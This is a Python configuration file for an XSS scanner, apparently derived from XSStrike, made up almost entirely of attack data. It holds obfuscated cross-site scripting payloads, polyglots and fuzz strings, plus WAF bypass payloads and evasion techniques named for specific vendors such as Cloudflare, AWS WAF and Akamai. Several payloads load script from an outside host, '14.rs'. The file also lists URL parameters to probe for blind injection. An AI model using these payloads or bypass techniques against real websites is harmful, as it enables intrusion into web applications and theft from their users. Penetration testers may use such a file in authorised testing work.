changes = '''CSP analyzer; mXSS detection; DOM clobbering; polyglot payloads; per-vendor WAF bypass; multi-encoder'''
globalVariables = {}

defaultEditor = 'nano'
blindPayload = ''
xsschecker = 'v3dm0s'

proxies = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}

minEfficiency = 90
delay = 0
threadCount = 10
timeout = 10

specialAttributes = ['srcdoc', 'src']

badTags = ('iframe', 'title', 'textarea', 'noembed',
           'style', 'template', 'noscript')

tags = ('html', 'd3v', 'a', 'details', 'svg', 'math', 'body')

jFillings = (';')
lFillings = ('', '%0dx')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/', '%0c', '%0b')

eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a', 'svg'],
    'onmouseover': ['a', 'html', 'd3v', 'svg'],
    'onload': ['svg', 'body', 'html'],
    'onerror': ['img', 'svg', 'body', 'html'],
    'onfocus': ['a', 'html', 'd3v', 'svg', 'details'],
    'onclick': ['a', 'd3v', 'html', 'svg', 'details'],
    'onpointerover': ['d3v', 'details', 'html', 'a', 'svg'],
    'onpointerdown': ['d3v', 'details', 'html', 'a', 'svg'],
    'onpointerup': ['d3v', 'details', 'html', 'a', 'svg'],
    'onselect': ['a', 'html', 'svg'],
    'onchange': ['a', 'html', 'svg'],
    'onsubmit': ['a', 'html', 'svg', 'form'],
}

functions = (
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()',
    'eval(name)', 'location=name',
    'print()', 'top['+chr(100)+']()',
)

payloads = (
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
)

polyglot_payloads = (
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    '"><svg onload=confirm(1)>"onmouseover=confirm(1) "><img src=x onerror=confirm(1)>',
    '<!--><img src=x onerror=confirm(1)><!--><svg onload=confirm(1)><!-->',
    '\'"><img src=x onerror=confirm()>\'"><svg onload=confirm()>',
    ';confirm()//\\<script>confirm()</script>',
    '\\";confirm()//\\\';confirm()//<!--></script></textarea></title></style></noscript><img src=x onerror=confirm()>',
)

fuzzes = (
    '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
    '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
    '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
    '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
    '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>',
    '<test%0Aonload=x', '<test%0Conload=x', '<test%0Donload=x',
    '<test/onload=x', '<test/o%0anload=x', '<test/o%0cnload=x',
)

waf_bypass_strategies = {
    'Cloudflare': {
        'techniques': ['obscure_event_handlers', 'js_obfuscation', 'unicode_escape', 'comment_injection'],
        'payload_prefixes': ['<svG/', '<deTails/', '<mAth/', '<a '],
        'encoding': ['unicode', 'hex', 'mixed'],
    },
    'AWS WAF': {
        'techniques': ['double_encoding', 'mixed_case', 'parameter_pollution', 'request_size_exhaustion'],
        'payload_prefixes': ['<', '%253C', '%3C', '<![CDATA[<'],
        'encoding': ['double-url', 'mixed', 'decimal-entities'],
    },
    'Akamai': {
        'techniques': ['polyglot', 'svg_animation', 'no_script_keyword', 'unicode_normalization'],
        'payload_prefixes': ['<svG/', '<mAth/', '<a/'],
        'encoding': ['hex-entities', 'decimal-entities', 'unicode'],
    },
    'ModSecurity': {
        'techniques': ['fragmentation', 'entity_encoding', 'case_variation', 'null_byte'],
        'payload_prefixes': ['<', '<![CDATA[<', '%3C', '<!---->'],
        'encoding': ['decimal-entities', 'unicode', 'hex'],
    },
    'Google Cloud Armor': {
        'techniques': ['double_encoding', 'fragmentation', 'unicode_normalization'],
        'payload_prefixes': ['<', '%253C', '<!---->'],
        'encoding': ['double-url', 'mixed'],
    },
    'Fastly': {
        'techniques': ['js_obfuscation', 'entity_encoding', 'obscure_event_handlers'],
        'payload_prefixes': ['<svG/', '<deTails/', '<mAth/'],
        'encoding': ['hex', 'unicode'],
    },
    'Azure WAF': {
        'techniques': ['parameter_pollution', 'double_encoding', 'mixed_case'],
        'payload_prefixes': ['<', '%253C', '<!---->'],
        'encoding': ['double-url', 'decimal-entities'],
    },
}

bypass_payloads = (
    '<!----><svG/oNloAd=confirm()>',
    '<%0AsvG%0AoNloAd%0A=%0Aconfirm()>',
    '<svG/onload=&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#41;>',
    '<dEtailS%0aONPointerEnter=(confirm)``>',
    '<mAth><mAth/oNnoUsEful=confirm()>',
    '<svG%0aonload=&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;&#x28;&#x29;>',
    '<img src=x:confirm`` onerror=eval(src)>',
    '<input autofocus onfocus=confirm() autofocus>',
    '\\"-[confirm()]-\\"',
    '<body onload=confirm() onload=confirm()>',
    '<details open ontoggle=co\u006efirm()>',
    '%253Cscript%253Econfirm()%253C/script%253E',
    '<form><button formaction=javascript:confirm(1)>X</button></form>',
    '<isindex type=image src=1 onerror=confirm(1)>',
    '<script\\x20type\\x3d\\x22text\\x2fjavascript\\x22>confirm(1)<\\/script>',
    '<meta http-equiv="refresh" content="0;javascript:confirm(1)">',
)

waf_fuzzes = (
    '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
    '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
    '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
    '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
    '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>',
    '<test%0Aonload=x', '<test%0Conload=x', '<test%0Donload=x',
    '<test/onload=x', '<test/o%0anload=x', '<test/o%0cnload=x',
    '<!----><test>', '<test%00onload=x', '<test%250Aonload=x',
    '<test/**/onload=x', '<test/onload=confirm``>',
    '<test/ONLOAD=CONFIRM()>', '<test/oNlOaD=CoNfIrM`1`>',
    '<test%0a%0d%09onload=x', '<test%0c%0b%09onload=x',
)

headers = {
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

blindParams = [
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message',
    'next', 'prev', 'callback', 'jsonp', 'format', 'action', 'module', 'page', 'view', 'template',
    'include', 'path', 'document', 'folder', 'root', 'dir', 'show', 'display', 'load_file',
]
